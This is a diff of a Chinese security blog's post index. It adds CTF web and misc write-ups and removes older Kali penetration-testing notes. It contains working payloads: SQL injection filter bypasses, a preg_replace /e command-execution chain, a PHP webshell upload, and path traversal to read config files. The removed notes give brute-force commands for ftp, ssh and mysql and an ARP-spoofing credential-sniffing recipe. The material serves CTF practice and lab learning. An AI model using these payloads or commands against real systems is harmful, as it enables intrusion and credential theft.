导出列名得值构建sql语句 文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+’.jpg 得到回显为：36427215695199 转化字符串为!!_@m_ 继续构造sql函数 文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+’.jpg 得到回显为：92806431727430 转化字符串为Th.e_F 文件名’+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+’.jpg 得到回显560750951 转化为!lag 拼接完成为!!_@m_ Th.e_F!lag即为flag值 6. PHP2进行目录扫描，发现index.php的备份文件index.php2, 访问index.php2文件查看源代码，根据代码要使登录成功必须满足两个条件，第一步，要使得”admin”===$_GET[id]不成立 第二步，经过$_GET[id] = urldecode($_GET[id]);，使得$_GET[id] == “admin”成立。 ?id=%2561dmin urldecode/urlencode 当传入参数id时，浏览器在后面会对非ASCII码的字符进行一次urlencode 然后在这段代码中运行时，会自动进行一次urldecode 在urldecode()函数中，再一次进行一次解码 urldecode(%2561)=%61 urldecode(%61)=a 7. unserialize3 ——php反序列化打开网页后是一段php代码，对其进行审计，进行序列化 然后通过_wakeup()执行漏洞（一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数）来绕过这个wakeup函数。我们把序列码修改其属性1为2后，输入url中，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行 8. Cat ——命令注入看到题目尝试ping下可通，用命令连接符连接命令，ls，echo，cat等命令发现无果 url中可接受url编码，%80特殊ascii码符号，url编码使用的是16进制，80也就是128，ASCII码是从0-127，使其产生报错，根据报错信息可得知是基于python环境django web框架，根据框架得信息和框架结构，使用php curl，@ 访问配置文件@/opt/api/api/settings.py，搜索关键词database，等到数据库的信息 访问@/opt/api/database.sqlite3，搜索关键字ctf，得到flag值 9. ics-04——sql post注入 首先先尝试一下登录，注册一个名为admin的账号，登录后，告诉我是普通用户，无效 点击一下忘记密码，看看有没有其他出路 修改的还是admin普通账户，现在我开启burp进行拦包，看有没有越权操作，好像有没有什么可以操作的，到时揽到一个post的包，sqlmap跑一下再说 跑出来了，密码进行md5解密，为1qazWSXED56yhn8ujm9olk81wdfTG，去登陆，成功，取得flag 10.Isc-05 进入指定页面发现平白无奇，查看源代码，发现传参page，在url尝试一波，试了一下不是命令执行，而是php伪协议的文件包含 Php伪协议base64读取index.php源代码。 把转化明文，从源代码中可以看出要求X_FORWARDED_FOR为127.0.0.1，并且有3个get方式可传参数，pat、rep、sub 构造url：/index.php?pat=/(.*)/e&amp;rep=system(‘ls’)&amp;sub=aa 如图 ?pat=/(.*)/e&amp;rep=system(‘ls+s3chahahaDir’)&amp;sub=aa 查看s3chahahaDir文件夹 ?pat=/(.*)/e&amp;rep=system(‘ls+s3chahahaDir/flag’)&amp;sub=aa 查看flag文件夹，发现flag.php文件 /index.php?pat=/(.*)/e&amp;rep=system(‘cat+s3chahahaDir/flag/flag.php’)&amp;sub=aa 查看flag， 在查看页面源代码中可以看到flag值 11.BUG开局就注册和登陆的界面 先任意注册一个用户，登陆后发现cookie user值是md5加密的，发现cookie值得组成方式是”uid:用户名”的形式组成的，可得到admin用户的cookie未加密时为”1:admin” 修改user为admin加密的md5值，刷新发现home模块还是显示abc用户，并且menge模块不可看 点击persional，修改url的uid为1，就可以admin的个人信息 退出登陆，然后去找回密码的功能模块，根据得到个人信息修改密码 修改完密码后进行登陆，点击Manager模块，报IP错误，修改ip为X-Forwarded-For: 127.0.0.1，成功，后查看源代码有传参可以传，”?module=filemanage&amp;do=???”尝试之后？？？为upload 上传一个php文件，为了绕过进行里php语言的特殊写法如图，进行绕过处理mime改为image/png,文件名为:php4,上传成功，回宣得到flag值 12.wtf.sh-150进入后发现是一个论坛网站，有登录注册，帖子，任意点击一个帖子，发现url中有可测试的尝试，尝试一波发现有文件包含漏洞，可以爆出源代码，将源代码格式化一下方便阅读 从源代码中可以看到存在user目录，且admin登录可以得到flag，遍历进入users目录后好像可以看到类似admin账号cookie 注册一个账户，登录后修改相关的cookie值，刷新后登录为admin账户 点击profile标签，在网页末尾可以看到flag值，但这只是flag值前一部分 13.i-got-id-200初始界面是这样的，点进files，是一个文件上传界面，url中页面文件格式是.pl,可知是perl语言编写的，通过多次上传图片文件，文本格式文件，发现都会输出成文本， 由此猜测是这样的编程格式 param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 ARGV是PERL默认用来接收参数的数组,不管脚本里有没有把它写出来,它始终是存在的。 所以在上传文件进行拦包改包，添加avgv参数，通过测试发现成功 猜测目录下可能存在flag文件成功读取flag值 14.ics-07打开进去指定页面url个page参数，并且下方可以查看源代码 源代码中可以看出要绕过id 绕过要注意的三个点为： （1）floatval（$ _ GET [id]）！==’1’ //浮点不为1 （2）substr（$ _ GET [id]，-1）===’9‘ //id最后一位为9 （3）Mysql查询结果限制，id不能过大， 构建exp ?page=&amp;id=1/9&amp;submit=提交查询#，可得到admin， 再根据源代码审计，post方式提交一个文件，真实的上传路径是uploaded， 进行文件过滤，要注意的三个点为： （1）$filename = “backup/“.$file; //目录为假目录，传入file时，加上一个../ （2）’/.+.ph(p[3457]?|t|tml)$/i’ //正则过滤文件只匹配最后一个点的后缀，可以写入两次.php （3）真实上传目录为upload 构建exp为file=../123.php/1.php/..&amp;con=&lt;?php passthru($_GET[bash]);?&gt;,用post方式进行传递 访问:http://111.198.29.45:55105/uploaded/123.php?bash=cat%20../flag.php 查看源代码得到flag值 15.Web2点进去后发现是解密的题 审计后我们先解密$_变量 a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws str_rot13 — 对字符串执行 ROT13 转换 =》rot13解密 n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf strrev — 反转字符串 =》fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n base64解码=》~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg 由此构建php文件 这里需要翻转一下$_变量 解析php文件得到flag值 16.Website是一个是登录页面，首先扫一下目录，扫出一个test.php页面，base64的值解密出来是乱码， 返回注册一个用户，并登录， 登录后，好像普通用户无法等到flag值，查看cookie值并尝试修改cookie值为刚才的base64,刷新后发现是admin账户了，并且等到flag值 17.Zhuanxv——javaweb HQL注入 整一个静态界面，源码也找不出什么，目录扫描烧到list目录进入后到登录界面 在github找到Zhuanxv application的项目，https://github.com/Lazyboxx/zhuanxvapplication 用初始账号密码登录失败，爆破一下密码，密码是：6yhn7ujm 登录进去发现没有利用的点，查看登录界面的源代码，进行审计发现有一个可疑的参数，进行文件包含下载 在从github项目committed的历史记录中可以知道使用maven框架搭建的web 因为使用javaweb的maven框架，有通用的目录结构 http://111.198.29.45:37888/loadimage?fileName=../../WEB-INF/web.xml 下载web.xml WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>ctf</category>
       </categories>
       <tags>
-        <tag>密码破解</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[dnschefDNS欺骗]]></title>
-    <url>%2F2019%2F04%2F24%2FDNS%E6%AC%BA%E9%AA%97%2F</url>
-    <content type="text"><![CDATA[dnschef –fakeip=192.168.200.2 –fakedomains=www.baidu.com,www.qq.com –interface 192.168.200.243 -qfackip欺骗到指定的ip，facedomains欺骗域名window修改dns服务器]]></content>
+    <title><![CDATA[攻防世界misc新手区 Wiretup]]></title>
+    <url>%2F2020%2F07%2F11%2F%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp%2F</url>
+    <content type="text"><![CDATA[1.this_is_flag标线即为flag值 2.ext3下载文件后放进linux，flie命令查看是什么文件，可以看到是磁盘文件，将其挂载 可以查看flag文本文件，cat查看得base64的编码，进行转换得flag值 3.give_you_flag下载后是一张gif有一副二维码的图片，用Stegsolve保存二维码的图片 用ps软件修复二维码图片，二维码扫出来即为flag值 4.pdf下载后是一个pdf文件，将pdf转换word文件，我这里用wps自带转换 打开转换的word，删除图片或移动缩小图片，即可看见图片下藏着flag值 5.stegano将pdf用浏览器打开选择全选，复制到记事本里去，可以发现AABB的一段文字，是摩斯电码，A是点，B是划等到-.-. — -. –. .-. .- - ..- .-.. .- - .. — -. … –..– ..-. .-.. .- –. —… .—- -. …- .—- ….. .—- -… .-.. …– – …– ….. ….. ….- –. …–转化成字母即为flag flag格式是flag{1nv151bl3m3554g3} 6.SimpleRAR下载后是一个压缩包，用winhex查看一下，可以secret.png文件，把A8 3C 7A修改为A8 3C 74,这个是RAR对png文件头的编码.解压可以看到一张png图片，显示空白 再用winhex打开png图片，可以看到GIF文件头，GIF (gif)，文件头：47494638，把png文件格式改为gif 把gif发到stesolve跑一下，只弄出来一半。 再把gif丢进ps里，是两个图层的，导出另一图层的一张，再丢进stegsolve跑下，跑出二维码破碎的上部分 再报这两张图片丢进ps，ps修复一下，flag{yanji4n_bu_we1shi} 7.坚持60s用jd-gui 打开下载的java程序，搜索关键字flag，得到是base64编码进行转化 8.gif下载是个压缩包，进行解压时一堆黑白的图片，可以联想二进制，白是0，黑是1二进制转换成字符串，得flag值 9.掀桌子 每两个一组，将16进制转换为10进制，减去128以后输出 ascii 10.如来十三掌打开是与佛论禅，到http://keyfc.net/bbs/tools/tudoucode.aspx解密，佛了。 解 rot-13 ，得到ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9在base64解码flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab} 11.base64stego下载来一个解压包，需要密码，伪加密来着，用winrar修复功能修复一下就可以打开了，打开一大串base64，应该是吧，直接解解不出来 参考https://www.tr0y.wang/2017/06/14/Base64steg/使用脚本处理一下 12.功夫再高也怕菜刀下载下来是个流量包，binwalk跑一下，里面还包含一个zip，foremost分离文件 ，zip包需要密码，不是弱密码 分析流量包，搜索flag.txt关键字，在1150行，追踪tcp流量流，发现jpg十六进制加密，还原jpg图片，图片文字即压缩包密码， flag值为：]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>ctf</category>
       </categories>
       <tags>
-        <tag>中间人攻击</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[使用john破解密码]]></title>
-    <url>%2F2019%2F04%2F24%2Fjohn%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[john Created directory: /root/.john John the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx] Copyright (c) 1996-2015 by Solar Designer and others Homepage: http://www.openwall.com/john/ Usage: john [OPTIONS] [PASSWORD-FILES] --single[=SECTION] &quot;single crack&quot; mode --wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin --pipe like --stdin, but bulk reads, and allows rules --loopback[=FILE] like --wordlist, but fetch words from a .pot file --dupe-suppression suppress all dupes in wordlist (and force preload) --prince[=FILE] PRINCE mode, read words from FILE --encoding=NAME input encoding (eg. UTF-8, ISO-8859-1). See also doc/ENCODING and --list=hidden-options. --rules[=SECTION] enable word mangling rules for wordlist modes --incremental[=MODE] &quot;incremental&quot; mode [using section MODE] --mask=MASK mask mode using MASK --markov[=OPTIONS] &quot;Markov&quot; mode (see doc/MARKOV) --external=MODE external mode or word filter --stdout[=LENGTH] just output candidate passwords [cut at LENGTH] --restore[=NAME] restore an interrupted session [called NAME] --session=NAME give a new session the NAME --status[=NAME] print status of a session [called NAME] --make-charset=FILE make a charset file. It will be overwritten --show[=LEFT] show cracked passwords [if =LEFT, then uncracked] --test[=TIME] run tests and benchmarks for TIME seconds each --users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only --groups=[-]GID[,..] load users [not] of this (these) group(s) only --shells=[-]SHELL[,..] load users with[out] this (these) shell(s) only --salts=[-]COUNT[:MAX] load salts with[out] COUNT [to MAX] hashes --save-memory=LEVEL enable memory saving, at LEVEL 1..3 --node=MIN[-MAX]/TOTAL this node&#39;s number range out of TOTAL count --fork=N fork N processes --pot=NAME pot file to use --list=WHAT list capabilities, see --list=help or doc/OPTIONS --format=NAME force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats 破解linux密码显示已完成破解的密码文件john破解缓存文件夹 john破解windows密码显示破解的密码 john的图形化界面——johnnyjohnny破解linux密码]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[arp攻击]]></title>
-    <url>%2F2019%2F04%2F24%2Farp%E6%94%BB%E5%87%BB%2F</url>
-    <content type="text"><![CDATA[arpspoof -h Version: 2.4 Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host aspspoof -t 被攻击ip -r 网关ip然后可以看到winows主机的arp表的变化这时所有的windows通过网关都会转到kali上，所以被攻击无网络服务了。kali开启路由转发，echo 1 &gt; /proc/sys/net/ipv4/ip_forward此时windows就可以上网了，但是所有的流量都经过kali进行转发。利用kali网卡wireshark进行抓包driftnet抓取目标机数据图片创建arotemp目录存放数据图片音频信息，driftnet -i eth0 -a -d arptemp -s-i 选择接口 -a 数据存放目录 -d 指定目录-s 抓取音频仅支持MOEG获取目标浏览url信息urlsnarf -i eth0dsniff 对目标密码进行捕获，]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>中间人攻击</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[markdown语法]]></title>
-    <url>%2F2019%2F03%2F29%2Fmarkdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C%2F</url>
-    <content type="text"><![CDATA[1. 斜体和粗体*斜体* //斜体 **粗体** //粗体 2. 分级标题用#——#####以”#”的个数进行逐级分级，1-5级;用h1——h5逐级分级 3. 外链接使用 [描述](链接地址) 为文字增加外链接 5.段落和换行 第一种写法：直接敲两个回车键即可 第二种写法:在写完一段后敲两个空格，然后回车写下一段 第三种写法:&lt;br /&gt;作为换行，然后写下一段6.分隔线&amp;引言` === ` 引言&gt;加___ 还有一种写法就是每一行都用一个 “&gt;” 号&lt;br&gt;&gt; &gt; 另外一种就是嵌套引用 7.列表 无序列表无序列表可以在每行开头用星号、加号、减号来表示，也可以三者混合一起，推荐使用相同的字符，避免混乱 有序列表有序列表用数字接着一个英文句点来表示，数字可无序，但还是推荐使用1.、2.，避免混乱。 8.代码代码块用两个这种符号围住 用`（语言）把代码起始行末尾行围住用tap键 9.更多阅读&lt;!--more--&gt;]]></content>
-      <tags>
-        <tag>item</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[hash_identifier和Hashid猜测识别加密算法]]></title>
-    <url>%2F2019%2F03%2F29%2Fhash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
-    <content type="text"><![CDATA[1.hash-identifier2.hashid]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[使用medusa破解密码]]></title>
-    <url>%2F2019%2F03%2F29%2F%E4%BD%BF%E7%94%A8medusa%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[medusa -h查看帮助 主要参数： -h 目标域名或ip-H 包含ip后域名的文件-u 用户名测试-U 包含要测试的用户名的文件-p 密码测试-P 包含要测试的密码的文件-e[n/s/ns] 添加其他密码检查条件 (无密码,密码 = 用户名)-M 要执行的模块的名称 (不包括. mod 扩展)-d 输出所有模块-n 用于非默认 TCP 端口号-s 启用ssl medusa -d 输出所有模块 medusa破解ftp 靶机开启ftp服务，攻击机进行破解medusa -u root -P comon.lst -h 192.168.200.243 -M ftp medusa破解mysqlmedusa -u root -P comon.lst -h 192.168.200.244 -e ns -M mysql mysql无密码 medusa破解sshmedusa -u root -P comon.lst -h 192.168.200.244 -e ns -M ssh]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[pw-inspector筛选字典内容]]></title>
-    <url>%2F2019%2F03%2F29%2Fpw-inspector%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8%E5%86%85%E5%AE%B9%2F</url>
-    <content type="text"><![CDATA[pw-inspector -h查看帮助 -i 输入文件-o 输出文件-m 有效密码的最小长度-M 有效密码的最大长度-l 小写字母-u 大学字母-p 可打印的字符 -s 特殊字符-n 数字 pw-inspector -i pass.lst -o up.lst -l筛选pass.lst字典小写字符输出为lp.lst(包含一个小写字母也算) pw-inspector -i pass.lst -o up.lst -l u筛选pass.lst字典小写字符输出为up.lst(包含一个大写字母也算)]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[使用hydra破解密码]]></title>
-    <url>%2F2019%2F03%2F29%2F%E4%BD%BF%E7%94%A8hydra%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[1.windows密码破解 smb密码破解设置windows账号密码，linux的ssh登陆密码破解hydra破解ftp登陆账号密码hydra破解表单密码，这里是我是dvwa页面破解。密码破解的特征是密码正确会跳转到index.php页面。使用post方式提交密码。hydra -l admin -P comon.lst 192.168.200.244 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vxhydra是hydra的图形界面]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[crunch创建密码字典]]></title>
-    <url>%2F2019%2F03%2F18%2Fcrunch%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81%2F</url>
-    <content type="text"><![CDATA[crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] – &lt;charset string&gt;默认是小写字符 crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100 – -b 按大小分割字典文件（kb/kib、mb/mib、gb/gib） – -c 每个字典的行数 – 以上两个参数必须与-o START 结合使用 – -d 同一字符连贯出现数量（11 / aaa) /usr/share/crunch/charset.lst crunch 内置字符文件 使用crunch 内置字符文件字符集hex-lower创建字典 crunch 1 1 -p 1234567890 | more -p参数指定字符串对对其所有排序组合列车，此命令意思是对1234567890列出这10个数字所有排列组合。其前面的指定密码长度无效 字典组成规则 – crunch 6 6 -t @,%%^^ | more– @：小写字母 lalpha –— ,：大写字母 ualpha– %:数字 numeric– ^:符号 symbols 输出文件压缩 – crunch 4 4 -t @,%^ -o 1.txt -z 7z –其他压缩格式：gzip、bzip2、lzma – 7z压缩比率最大]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[nmap扫描]]></title>
-    <url>%2F2019%2F03%2F11%2Fnmap%E6%89%AB%E6%8F%8F%2F</url>
-    <content type="text"><![CDATA[nmap是一款开源免费的网络发现和安全审计工具，扫描端口、操作系统的版本、端口对应运行的服务等等。zenmap是nmap官方提供的图形界面工具 nmap XXX.XXX.XXX.XXX 完整扫描 nmap -v XXX.XXX.XXX.XXX 打印每一步扫描 nmap -f XXX.XXX.XXX.XXX 扫描常见的端口 nmap -sV XXX.XXX.XXX.XXX 检测服务详细信息 nmap -O XXX.XXX.XXX.XXX 检测主机操作系统以及硬件信息 nmap –script=vuln XXX.XXX.XXX.XXX 扫描目标系统漏洞 namp -sT xxx.xxx.xxx.xxx TCP扫描，这种扫描可能会被目标机系统日志记录 namp -sS tcp syn（半扫描）扫描，一般不会被目标机系统日志记录 namp -sU udp扫描，但是一般不可靠 nmap -v（显示每一条信息） -sn （扫描存活主机，不扫描端口）-PE（通过PE确定机器是否开启） XXX.XXX.XXX.1/24 扫描整个子网 nmap -v -sn -PE XXX.XXX.XXX.1-5指定范围扫描 nmap -v -p 135 XXX.XXX.XXX.XXX扫描指定135端口（多个端口逗号分隔） nmap -sS XXX.XXX.XXX.XXX SYN扫描，隐蔽扫描（不需要创建完整链接）端口：默认情况下，nmap会扫描1000个最有可能开放的tcp端口 namp默认（局域网）扫描 扫描系统信息 扫描系统漏洞 局域网扫描 指定端口扫描，如果未指定端口默认1-1000]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>信息收集</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[linux搭建DNS服务器]]></title>
-    <url>%2F2019%2F03%2F08%2Flinux%E6%90%AD%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
-    <content type="text"><![CDATA[一.远程登陆&amp;配置yum源下载xshell 安装打开,输入虚拟机ip地址,默认端口号22,然后填账号(root),密码,登陆成功. 配置yum源cd /etc/yum.repos.d/ //进入/etc/repo目录 vim web163.repo //新建yum源文件 配置的网易的yum源(可粘贴复制)32位的系统选这个 [wed163] name=wed baseurl=https://mirrors.163.com/centos/6/os/i386/ mediaid=1384196515.415715 metadata_expire=-1 gpgcheck=1 cost=500 enabled=1 gpgkey=https://mirrors.163.com/centos/6/os/i386/RPM-GPG -KEY-CentOS-6 64位系统选这个 [wed163] name=wed baseurl=https://mirrors.163.com/centos/6/os/x86_64/ mediaid=1384196515.415715 metadata_expire=-1 gpgcheck=1 cost=500 enabled=1 gpgkey=https://mirrors.163.com/centos/6/os/x86_64/RPM-GPG-KEY-CentOS-6 保存退出,下面清理yum缓存且进行测试 clean yum all //清除缓存 clean yum makecache //重新下载缓存 yum repolist //查看yum安装包数量 安装dns,配置dns安装dns,安装成功即可进行下一步yum install bind -y //安装dns(即bind),-y确认 rpm -qa|grep bind //查看bind是否安装成功有bind的相关 配置dns配置主配置文件 named.confcd /etc/ ls named* //查看named相关配置文件 可ka看到named.conf即dns主配置文件 vim /etc/named.conf //编辑主配置文件 如下图所示,进行部分修改,把这三项修改就保存退出 配置正向解析区域vim /etc/named.rfc1912.zones 进行添加解析,修改如图所示.在下面的第二图中,我添加的是”jaie32.com”,这里可以修改成你自己喜欢的域名 ####配置正向区域数据库文件 cd /var/named/ //进入配置目录 ls //查看目录文件 cp -p named.empty jaie32.com.zone //完成复制named.empty文件命名jaie32.com vim jaie32.com.zone //编辑文件,并进行一些修改改如下图所示,完成保持退出 这里的IP地址是自己主机地址,使用ifconfig命令可查看 ###修改主机dns服务器位自己的ip vim /etc/resolv.conf //打开之后修改如下图所示 ####到这里配置基本完成了,下面重启服务 service named restart //重启dns服务 测试dns方法一:ping自己域名(推荐,简单方便)ping www.jaie32.com //可以看到自己的ip,ping通即成功 方法二:nslookup命令nslookup //输入nslookup,然后输入自己的域名如图所示 方法三:dig命令测试dig www.jaie32.com //dig 域名 安装web服务器测试yum install httpd -y //安装web服务器包 service httpd start //启动web服务 然后再打开虚拟机服务器,打开浏览器,输入域名.结果如图所示]]></content>
+    <title><![CDATA[搭建本地yum服务器]]></title>
+    <url>%2F2020%2F07%2F11%2F%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
+    <content type="text"><![CDATA[1.在linux安装apache我这里是拿kali虚拟机自带的apache做中间件。dpkg -L apache2查看apache相关的文件,在/var/www下web网页放置 2.虚拟机挂载cent光盘df -h 列出文件系统、找出光盘的文件系统，mount /dev/sr1 /mnt/cdrom挂载/dev/sr1到/mnt/cdrom 3.将光盘的安装包拷贝到web目录下mkdir /var/www/centos 创建目录 /var/www/centos mkdir /var/www/centos/x86_64创建目录/var/www/centos/x86_64mkdir /var/www/centos/extra创建目录/var/www/centos/extramkdir /var/www/centos/update创建目录/var/www/centos/updatecd /mnt/cdrom/ls进入挂载光盘的目录 查看光盘文件cp Packages/* /var/www/centos/x86_64/ 把 Packages/下的软件包复制到/var/www/centos/x86_64/目录下，apt-get install -y createrepo下载createrepo，目的是生成repodata目录createrepo -pdo /var/www/centos/x86_64 /var/www/centos/x86_64createrepo -pdo /var/www/centos/extra /var/www/centos/extracreaterepo -pdo /var/www/centos/update /var/www/centos/eupdate重启一下apache服务service apache2 restart测试访问web网页，ip为虚拟机的4.客户端配置访问yum源服务器vim /etc/yum.repos.d/CentOS-Base.repoyum clean all 清除所有缓存yum makecache 重新下载缓存可以发现已经可以了，现在测试一下，下载一个tree包试一下yum install tree -y可能cdrom里面的包不够多，我们同步一下163远程的包，用rsync协议rsync -avrt --delete rsync://mirrors.163.com/centos/6/updates/x86_ 64/Packages/ /var/www/centos/update]]></content>
       <categories>
         <category>linux</category>
       </categories>
@@ -317,19 +108,8 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[kali破解密码，pe破解密码]]></title>
-    <url>%2F2019%2F03%2F08%2Fwindows%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%2F</url>
-    <content type="text"><![CDATA[kali破解windows密码1.镜像u盘启动（这里用虚拟机模拟） windows增加test用户设置密码，iso镜像：kali 2.BOIS启动，在bois引导中把cd/rom方式置顶。F10保持退出，进入kali安装界面显示，选第一，进入kali。 挂载WINDOW的c盘，破解密码 fdilk -l查看磁盘!并挂载C盘 使用samdump2合并导出SAM和system数据，cat数据内容，jonh破解密码删除windows密码 chntpw修改SAM!这里选1编辑密码选择修改用对应的ID选择1清除密码成功后选q退出，再选y选择保存 重启入bois选择硬盘引导，进入windows选择test用户会发现无需密码登陆了。 利用pe修改密码 创建一个或多个用户，u盘制作pe，（这里使用微pe软件），虚拟机在设置中添加磁盘代理u盘。在bois中把scsi设为第一引导，然后F10保存退出 在pe中选择windows密码修改软件（NTPWEdit）修改密码，然后把bois引导调回磁盘引导开机，可以发现windows用户密码已修改。]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>密码破解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[安装双系统kali和window10的几个坑点]]></title>
-    <url>%2F2019%2F03%2F08%2F%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9Fkali%E5%92%8Cwindow10%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9D%91%E7%82%B9%2F</url>
+    <url>%2F2020%2F07%2F11%2F%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9Fkali%E5%92%8Cwindow10%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9D%91%E7%82%B9%2F</url>
     <content type="text"><![CDATA[1.制作kaliu盘启动盘的软件选择我一开始是选择软碟通，制作完成，开机安装kali时，却说找不到u盘。百度google查找下，说是拔出u盘重试，或换个u盘接口，我试了不下10遍，完全没有用。再然后换了个制作U盘的软件rufus，尝试下也不行，然后换了个制作软件u盘软件win32diskimager，发现成功，可以探寻到u盘了，至于为什么只有win32diskimager可以，而软碟通和rufus不可以，我也是很不解的，好像kali官方推荐也是win32diskimager，而且有很多教程用软碟通和rufus却可以，也有很多人不可以，还是推荐用win32diskimager比较省心吧， 2.检测不到固态硬盘我的固电脑是全固态的，在安装检测分区时，检测不到我的固态硬盘，却可以检测我的u盘出来，我一开始是怀疑分区表的问题，我的固态分区表是GUID，U盘是MBR，能不成要转换成GUID，可是一转换，windows系统可能要崩。我插上我的移动硬盘（MBR）也可以检测到，问题就出在固态上，我看网上说可能是磁盘类型是动态磁盘，要调为基本磁盘才可行，但是我的磁盘本来就是基本磁盘，所以排除这个想法。另一个是bios中磁盘模式，要改一下，我就进我bios，但是没有发现有磁盘模式这个选择，难受。在来通过了解，发现是bios是初始版本，没有这个选项，我就上联想官网下载bios下载更新驱动，然后更新驱动就有磁盘模式的选项，我还是第一次更新bios驱动，然后磁盘模式有RAID和AHCI两种模式可选，默认是RAID的，我选AHCI，kali安装分区可以检测我的固态硬盘了，一路安装下去很顺利，kali安装完成可以开机，但当我选windows开机时发现开不起机，然后bios把磁盘模式调回RAID模式时，windows可以开机了，但kali却开不起机，也就是说]]></content>
       <categories>
         <category>渗透测试</category>
@@ -339,8 +119,74 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[修改远程桌面3389端口]]></title>
+    <url>%2F2020%2F07%2F11%2F%E4%BF%AE%E6%94%B9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A23389%E7%AB%AF%E5%8F%A3%2F</url>
